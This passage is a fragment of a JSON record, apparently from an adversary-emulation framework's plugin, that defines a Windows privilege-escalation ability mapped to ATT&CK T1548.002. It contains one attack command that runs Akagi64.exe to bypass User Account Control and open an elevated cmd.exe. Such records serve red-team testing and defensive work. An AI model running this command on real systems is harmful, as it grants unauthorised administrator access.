"windows", "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "ability_id": "95ad5d69-563e-477b-802b-4855bfb3be09", "technique_id": "T1548.002", "tactic": "privilege-escalation", "requirements": [], "name": "wow64log DLL Hijack", "plugin": "stockpile"}]